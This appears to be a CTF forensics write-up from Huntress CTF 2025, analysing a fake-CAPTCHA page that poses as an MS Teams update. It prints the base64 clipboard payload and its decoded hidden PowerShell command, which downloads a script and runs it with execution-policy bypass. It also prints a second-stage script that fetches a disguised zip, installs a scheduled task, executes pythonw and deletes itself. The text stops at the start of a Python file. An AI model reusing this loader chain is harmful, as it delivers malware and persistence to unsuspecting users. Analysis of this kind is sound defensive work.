<!DOCTYPE html> <html lang="en"><head>
<title>üêû Verify You Are Human</title>
<base href="../../..">
<meta name="pathname" content="walkthroughs/huntress-'25/day-1/üêû-verify-you-are-human.html">
<meta name="description" content="CTF-Writeups - üêû Verify You Are Human">
<meta property="og:title" content="üêû Verify You Are Human">
<meta property="og:description" content="CTF-Writeups - üêû Verify You Are Human">
<meta property="og:type" content="website">
<meta property="og:url" content="walkthroughs/huntress-'25/day-1/üêû-verify-you-are-human.html">
<meta property="og:image" content="undefined">
<meta charset="UTF-8"><meta property="og:site_name" content="CTF-Writeups"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0"><script async="" id="webpage-script" src="site-lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="site-lib/media/favicon.png"><link rel="stylesheet" href="site-lib/styles/obsidian.css"><link rel="preload" href="site-lib/styles/other-plugins.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/other-plugins.css"></noscript><link rel="preload" href="site-lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="site-lib/styles/supported-plugins.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/supported-plugins.css"></noscript><link rel="preload" href="site-lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/main-styles.css"></noscript><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-vertical-spacing:1.3em;--sidebar-margin:12px}:root{background-color:#202124}.sidebar{height:100%;font-size:14px;z-index:10;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));position:relative;overflow:hidden;overflow:clip;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}#left-sidebar{left:0}#right-sidebar{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}.sidebar.floating{position:absolute}.sidebar .leaf-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .leaf-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}#left-sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}#right-sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar #left-sidebar-content,.sidebar #right-sidebar-content{contain:none!important;container-type:normal!important;animation:none!important}.sidebar:has(.leaf-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:calc(2.3em + 2 * var(--sidebar-margin));width:var(--sidebar-width);padding:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}#left-sidebar .sidebar-topbar{left:0;flex-direction:row;border-top-right-radius:var(--radius-l)}#right-sidebar .sidebar-topbar{right:0;flex-direction:row-reverse;border-top-left-radius:var(--radius-l)}#left-sidebar .topbar-content{margin-right:calc(2.3em + var(--sidebar-margin));flex-direction:row}#right-sidebar .topbar-content{margin-left:calc(2.3em + var(--sidebar-margin));flex-direction:row-reverse}.topbar-content{overflow:hidden visible;overflow:clip visible;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:2px!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}#left-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}#right-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.feature-title{margin-left:1px;text-transform:uppercase;letter-spacing:.06em;margin-top:.75em;margin-bottom:.75em}.feature-header{display:flex;align-items:center;padding-top:0;font-size:1em;padding-left:0}body.floating-sidebars .sidebar{position:absolute}body{transition:background-color var(--color-fade-speed) ease-in-out}#navbar:not(:empty){display:flex;align-items:center;justify-content:space-between;padding:.5em 1em;width:100%}#main{display:flex;flex-direction:column;height:100%;width:100%;align-items:stretch;justify-content:center}#main-horizontal{display:flex;flex-direction:row;flex-grow:1;width:100%;align-items:stretch;justify-content:center}#center-content{flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0!important;transition:opacity .2s ease-in-out;pointer-events:none}#center-content>.obsidian-document{padding-left:2em;padding-right:1em;margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}body #center-content>.obsidian-document>.markdown-preview-sizer{padding-bottom:80vh;width:100%;max-width:var(--line-width);flex-basis:var(--line-width);transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document>div{width:100%!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document:not([data-type=markdown]).embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}#center-content>.obsidian-document:not([data-type=markdown]).embed>*{max-width:100%;max-height:100%;object-fit:contain}:not(h1,h2,h3,h4,h5,h6,li):has(> :is(.math,table)){overflow-x:auto!important}#center-content>.obsidian-document:not([data-type=markdown]){overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.obsidian-document[data-type=attachment]{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;width:100%}.obsidian-document[data-type=attachment]>*{outline:0;border:none;box-shadow:none}.obsidian-document[data-type=attachment] :is(img){max-width:90%;max-height:90%;object-fit:contain}.obsidian-document[data-type=attachment]>:is(audio){width:100%;max-width:min(90%,var(--line-width))}.obsidian-document[data-type=attachment]>:is(embed,iframe,video){width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain}.canvas-wrapper>:is(.header,.footer){z-index:100;position:absolute;display:flex;justify-content:center;flex-direction:column;width:100%;align-items:center}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){let e=document.querySelectorAll("link[itemprop='include']");for(const t of e){let e=t.getAttribute("href");try{let o="";if(e.startsWith("https:")||e.startsWith("http:")||"file:"!=window.location.protocol){const n=await fetch(e);if(!n.ok){console.log("Could not include file: "+e),t?.remove();continue}o=await n.text()}else{const t=document.getElementById(btoa(encodeURI(e)));if(t){const e=JSON.parse(decodeURI(atob(t.getAttribute("value")??"")));o=e?.data??""}}let n=document.createRange().createContextualFragment(o);t.before(n),t.remove(),console.log("Included text: "+o),console.log("Included file: "+e)}catch(o){t?.remove(),console.log("Could not include file: "+e,o);continue}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script")));!function e(n){let l=o[n],c=n+1;l?(l&&"true"!=l.getAttribute("loaded")||n<o.length&&e(c),n<o.length&&l.addEventListener("load",(()=>e(c)))):n<o.length?e(c):t()}(0)}</script></head><body class="publish css-settings-manager show-inline-title show-ribbon is-focused"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div id="main"><div id="navbar"></div><div id="main-horizontal"><div id="left-content" class="leaf" style="--sidebar-width: var(--sidebar-width-left);"><div id="left-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><div id="search-container"><div id="search-wrapper"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div aria-label="Clear search" id="search-clear-button"></div></div></div></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="left-sidebar-content" class="leaf-content"><link itemprop="include" href="site-lib/html/file-tree-content.html"></div></div><script defer="">let ls = document.querySelector("#left-sidebar"); ls.classList.toggle("is-collapsed", window.innerWidth < 768); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div></div><div id="center-content" class="leaf"><div class="obsidian-document markdown-preview-view markdown-rendered node-insert-event allow-fold-headings allow-fold-lists show-indentation-guide show-properties is-readable-line-width" data-type="markdown"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="header"><h1 class="page-title heading inline-title" id="üêû_Verify_You_Are_Human_0">üêû Verify You Are Human</h1><div class="data-bar"></div></div><div class="markdown-preview-pusher" style="width: 1px; height: 0.1px; margin-bottom: 0px;"></div><div class="el-blockquote"><blockquote dir="auto">
<p><strong>Platform Name</strong>: Huntress CTF - 2025<br>
<strong>Category</strong>: <a href="?query=tag:DFIR" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#DFIR">#DFIR</a>, <a href="?query=tag:Forensics" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#Forensics">#Forensics</a> , <a href="?query=tag:Malware" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#Malware">#Malware</a><br>
<strong>Date</strong>: 10-03-2025<br>
<strong>Author</strong>: Joe Lipinski</p>
</blockquote></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Table of Contents" dir="auto" class="heading" id="Table_of_Contents_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Table of Contents</h2></div><div class="el-ol"><ol>
<li data-line="0" dir="auto"><a class="internal-link" data-href="#case overview" href="#case overview" target="_self" rel="noopener nofollow">Case Overview</a></li>
<li data-line="1" dir="auto"><a class="internal-link" data-href="#Setup" href="#Setup_0" target="_self" rel="noopener nofollow">Setup</a></li>
<li data-line="2" dir="auto"><a class="internal-link" data-href="#evidence inventory &amp; chain of custody" href="#evidence inventory &amp; chain of custody" target="_self" rel="noopener nofollow">Evidence Inventory &amp; Chain of Custody</a></li>
<li data-line="3" dir="auto"><a class="internal-link" data-href="#malware analysis" href="#malware analysis" target="_self" rel="noopener nofollow">Malware Analysis</a></li>
<li data-line="4" dir="auto"><a class="internal-link" data-href="#indicators of compromise (IOCs)" href="#indicators of compromise (IOCs)" target="_self" rel="noopener nofollow">Indicators of Compromise (IOCs)</a></li>
<li data-line="5" dir="auto"><a class="internal-link" data-href="#att&amp;ck mapping" href="#att&amp;ck mapping" target="_self" rel="noopener nofollow">ATT&amp;CK Mapping</a></li>
<li data-line="6" dir="auto"><a class="internal-link" data-href="#findings &amp; flags" href="#findings &amp; flags" target="_self" rel="noopener nofollow">Findings &amp; Flags</a></li>
<li data-line="7" dir="auto"><a class="internal-link" data-href="#remediation &amp; recommendations" href="#remediation &amp; recommendations" target="_self" rel="noopener nofollow">Remediation &amp; Recommendations</a></li>
<li data-line="8" dir="auto"><a class="internal-link" data-href="#lessons learned" href="#lessons learned" target="_self" rel="noopener nofollow">Lessons Learned</a></li>
</ol></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Case Overview" dir="auto" class="heading" id="Case_Overview_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Case Overview</h2></div><div class="el-p"><p dir="auto"><strong>Background / Narrative:</strong><br>
"My computer said I needed to update MS Teams, so that is what I have been trying to do...<br>
...but I can't seem to get past this CAPTCHA!</p></div><div class="el-p"><p dir="auto">CAUTION<br>
<strong>This is the&nbsp;<code>Malware</code>&nbsp;category.</strong>&nbsp;Please be sure to approach this challenge material within an isolated virtual machine.</p></div><div class="el-p"><p dir="auto">NOTE<br>
Some components of this challenge may be finicky with the&nbsp;<em>browser-based</em>&nbsp;connection. You can still achieve what you need to, but there may be some more extra steps than if you were to approach this over the VPN.</p></div><div class="el-blockquote"><blockquote dir="auto">
<p>(<em>i.e., "remove the port" when you need to... you'll know what I mean</em>&nbsp;üòú)"</p>
</blockquote></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Setup" dir="auto" class="heading" id="Setup_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Setup</h2></div><div class="el-ul"><ul class="has-list-bullet">
<li data-line="0" dir="auto"><span class="list-bullet"></span><strong>Operating System:</strong> MacOS</li>
<li data-line="1" dir="auto"><span class="list-bullet"></span><strong>Tools Used:</strong> <a href="?query=tag:browser" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#browser">#browser</a>, <a href="?query=tag:VSCode" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#VSCode">#VSCode</a>, <a href="?query=tag:Gemini" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#Gemini">#Gemini</a></li>
<li data-line="2" dir="auto"><span class="list-bullet"></span><strong>Network Configuration:</strong> None</li>
</ul></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Evidence Inventory &amp; Chain of Custody" dir="auto" class="heading" id="Evidence_Inventory_&amp;_Chain_of_Custody_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Evidence Inventory &amp; Chain of Custody</h2></div><div class="el-table" dir="ltr" style="overflow-x: auto;"><table id="obsidian-sheets-parsed"><thead><tr><th class="" row-index="0" col-index="0">ID</th><th class="" row-index="0" col-index="1">Evidence Type</th><th class="" row-index="0" col-index="2">Filename / Source</th><th class="" row-index="0" col-index="3">Size</th><th class="" row-index="0" col-index="4">Hash (SHA-256)</th><th class="" row-index="0" col-index="5">Received From</th><th class="" row-index="0" col-index="6">Date/Time (UTC)</th></tr></thead><tbody><tr></tr><tr></tr><tr><td class="" row-index="2" col-index="0">E01</td><td class="" row-index="2" col-index="1">Webpage</td><td class="" row-index="2" col-index="2"><code>sample-1.html</code></td><td class="" row-index="2" col-index="3">824 KB</td><td class="" row-index="2" col-index="4"><code>e19dee0e01ba61d3372596400d854e4b3fccfc18e7d6a9ea16946dc91f9e8815</code></td><td class="" row-index="2" col-index="5">Source</td><td class="" row-index="2" col-index="6"><code>October 2, 2025 6:45:30 PM</code></td></tr><tr><td class="" row-index="3" col-index="0">E02</td><td class="" row-index="3" col-index="1">Webpage</td><td class="" row-index="3" col-index="2"><code>sample-2.txt</code></td><td class="" row-index="3" col-index="3">1 KB</td><td class="" row-index="3" col-index="4">a223dedff4425b908e5eb58fdf2d7d7a0cc15087da65b130424316b756245df1</td><td class="" row-index="3" col-index="5">Source</td><td class="" row-index="3" col-index="6"><code>October 2, 2025 6:50:39 PM</code></td></tr><tr><td class="" row-index="4" col-index="0">E03</td><td class="" row-index="4" col-index="1">PDF File</td><td class="" row-index="4" col-index="2"><code>sample-3.pdf</code></td><td class="" row-index="4" col-index="3">9.5 MB</td><td class="" row-index="4" col-index="4"><code>1014286cfd83f10a22f7ce9d4418b1c091cb45f135b6d3a7920110e5e067a83f</code></td><td class="" row-index="4" col-index="5">Source</td><td class="" row-index="4" col-index="6"><code>October 2, 2025 6:58:02 PM</code></td></tr><tr><td class="" row-index="5" col-index="0">E04</td><td class="" row-index="5" col-index="1">Python File</td><td class="" row-index="5" col-index="2"><code>sample-3.py</code></td><td class="" row-index="5" col-index="3">1 KB</td><td class="" row-index="5" col-index="4">5ce1c6674a96a060d0b3baa5f7d61f6d39bac2a9482a3ce470a4a8ccbef95b74</td><td class="" row-index="5" col-index="5">Source</td><td class="" row-index="5" col-index="6"><code>October 2, 2025 7:15:55 PM</code></td></tr></tbody></table></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Malware Analysis" dir="auto" class="heading" id="Malware_Analysis_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Malware Analysis</h2></div><div class="el-h3"><h3 data-heading="Static Analysis" dir="auto" class="heading" id="Static_Analysis_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Static Analysis</h3></div><div class="el-p"><p dir="auto">E01 was obtained from <code>https://c35b74dc.proxy.coursestack.com</code>, which contained a <code>unsecuredCopyToClipboard()</code> function with a base64 value:</p></div><div class="el-pre"><pre class="language-javascript"><code data-line="0" class="language-javascript is-loaded"><span class="token function">unsecuredCopyToClipboard</span><span class="token punctuation">(</span><span class="token function">decodeURIComponent</span><span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">"IkM6XFdJTkRPV1Ncc3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxQb3dlclNoZWxsLmV4ZSIgLVdpIEhJIC1ub3AgLWMgIiRVa3ZxUkh0SXI9JGVudjpMb2NhbEFwcERhdGErJ1wnKyhHZXQtUmFuZG9tIC1NaW5pbXVtIDU0ODIgLU1heGltdW0gODYyNDUpKycuUFMxJztpcm0gJ2h0dHA6Ly9jMzViNzRkYy5wcm94eS5jb3Vyc2VzdGFjay5jb206NDQzLz90aWM9MSc+ICRVa3ZxUkh0SXI7cG93ZXJzaGVsbCAtV2kgSEkgLWVwIGJ5cGFzcyAtZiAkVWt2cVJIdElyIg=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">When decoded, the stored value is:</p></div><div class="el-pre"><pre class="language-powershell"><code data-line="0" class="language-powershell is-loaded"><span class="token string">"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe"</span> <span class="token operator">-</span>Wi HI <span class="token operator">-</span>nop <span class="token operator">-</span>c <span class="token string">"<span class="token variable">$UkvqRHtIr</span>=<span class="token variable">$env</span>:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://c35b74dc.proxy.coursestack.com:443/?tic=1'&gt; <span class="token variable">$UkvqRHtIr</span>;powershell -Wi HI -ep bypass -f <span class="token variable">$UkvqRHtIr</span>"</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Upon visiting <code>http://c35b74dc.proxy.coursestack.com:443/?tic=1</code>, the following txt file (E02) is returned:</p></div><div class="el-pre"><pre class="language-powershell"><code data-line="0" class="language-powershell is-loaded"><span class="token variable">$JGFDGMKNGD</span> = <span class="token punctuation">(</span><span class="token namespace">[char]</span>46<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token namespace">[char]</span>112<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token namespace">[char]</span>121<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token namespace">[char]</span>99<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># decoded ".pyc"</span>
<span class="token variable">$HMGDSHGSHSHS</span> = <span class="token namespace">[guid]</span>::NewGuid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$OIEOPTRJGS</span> = <span class="token variable">$env</span>:LocalAppData<span class="token punctuation">;</span><span class="token function">irm</span> <span class="token string">'http://c35b74dc.proxy.coursestack.com:443/?tic=2'</span> <span class="token operator">-</span>OutFile <span class="token variable">$OIEOPTRJGS</span>\<span class="token variable">$HMGDSHGSHSHS</span><span class="token punctuation">.</span>pdf<span class="token punctuation">;</span>
<span class="token function">Add-Type</span> <span class="token operator">-</span>AssemblyName System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>Compression<span class="token punctuation">.</span>FileSystem<span class="token punctuation">;</span><span class="token namespace">[System.IO.Compression.ZipFile]</span>::ExtractToDirectory<span class="token punctuation">(</span><span class="token string">"<span class="token variable">$OIEOPTRJGS</span>\<span class="token variable">$HMGDSHGSHSHS</span>.pdf"</span><span class="token punctuation">,</span> <span class="token string">"<span class="token variable">$OIEOPTRJGS</span>\<span class="token variable">$HMGDSHGSHSHS</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$PIEVSDDGs</span> = <span class="token function">Join-Path</span> <span class="token variable">$OIEOPTRJGS</span> <span class="token variable">$HMGDSHGSHSHS</span><span class="token punctuation">;</span>
<span class="token variable">$WQRGSGSD</span> = <span class="token string">"<span class="token variable">$HMGDSHGSHSHS</span>"</span><span class="token punctuation">;</span>
<span class="token variable">$RSHSRHSRJSJSGSE</span> = <span class="token string">"<span class="token variable">$PIEVSDDGs</span>\pythonw.exe"</span><span class="token punctuation">;</span>
<span class="token variable">$RYGSDFSGSH</span> = <span class="token string">"<span class="token variable">$PIEVSDDGs</span>\cpython-3134.pyc"</span><span class="token punctuation">;</span>
<span class="token variable">$ENRYERTRYRNTER</span> = <span class="token function">New-ScheduledTaskAction</span> <span class="token operator">-</span>Execute <span class="token variable">$RSHSRHSRJSJSGSE</span> <span class="token operator">-</span>Argument <span class="token string">"`"<span class="token variable">$RYGSDFSGSH</span>`""</span><span class="token punctuation">;</span>
<span class="token variable">$TDRBRTRNREN</span> = <span class="token punctuation">(</span><span class="token function">Get-Date</span><span class="token punctuation">)</span><span class="token punctuation">.</span>AddSeconds<span class="token punctuation">(</span>180<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$YRBNETMREMY</span> = <span class="token function">New-ScheduledTaskTrigger</span> <span class="token operator">-</span>Once <span class="token operator">-</span>At <span class="token variable">$TDRBRTRNREN</span><span class="token punctuation">;</span>
<span class="token variable">$KRYIYRTEMETN</span> = <span class="token function">New-ScheduledTaskPrincipal</span> <span class="token operator">-</span>UserId <span class="token string">"<span class="token variable">$env</span>:USERNAME"</span> <span class="token operator">-</span>LogonType Interactive <span class="token operator">-</span>RunLevel Limited<span class="token punctuation">;</span>
<span class="token function">Register-ScheduledTask</span> <span class="token operator">-</span>TaskName <span class="token variable">$WQRGSGSD</span> <span class="token operator">-</span>Action <span class="token variable">$ENRYERTRYRNTER</span> <span class="token operator">-</span>Trigger <span class="token variable">$YRBNETMREMY</span> <span class="token operator">-</span>Principal <span class="token variable">$KRYIYRTEMETN</span> <span class="token operator">-</span>Force<span class="token punctuation">;</span>
<span class="token function">Set-Location</span> <span class="token variable">$PIEVSDDGs</span><span class="token punctuation">;</span>
<span class="token variable">$WMVCNDYGDHJ</span> = <span class="token string">"cpython-3134"</span> <span class="token operator">+</span> <span class="token variable">$JGFDGMKNGD</span><span class="token punctuation">;</span>
<span class="token function">Rename-Item</span> <span class="token operator">-</span>Path <span class="token string">"cpython-3134"</span> <span class="token operator">-</span>NewName <span class="token variable">$WMVCNDYGDHJ</span><span class="token punctuation">;</span>
<span class="token function">iex</span> <span class="token punctuation">(</span><span class="token string">'rundll32 shell32.dll,ShellExec_RunDLL "'</span> <span class="token operator">+</span> <span class="token variable">$PIEVSDDGs</span> <span class="token operator">+</span> <span class="token string">'\pythonw" "'</span> <span class="token operator">+</span> <span class="token variable">$PIEVSDDGs</span> <span class="token operator">+</span> <span class="token string">'\'</span><span class="token operator">+</span> <span class="token variable">$WMVCNDYGDHJ</span> <span class="token operator">+</span> <span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">Remove-Item</span> <span class="token variable">$MyInvocation</span><span class="token punctuation">.</span>MyCommand<span class="token punctuation">.</span>Path <span class="token operator">-</span>Force<span class="token punctuation">;</span>
<span class="token function">Set-Clipboard</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Upon visiting <code>http://c35b74dc.proxy.coursestack.com:443/?tic=2</code>, a blank PDF is returned. According to the above text file, (E02) the PDF is actually a zip file. Converting the PDF to a Zip and decompressing it, results in a folder containing python compiled files (.pyc), python executables, windows .dll files, sub-folders and one python source file (<code>output.py</code>). Upon examining the <code>output.py</code> file (E04), the following source code is found:</p></div><div class="el-pre"><pre class="language-python"><code data-line="0" class="language-python is-loaded"><span class="token keyword">import</span> base64
<span class="token comment">#nfenru9en9vnebvnerbneubneubn</span>
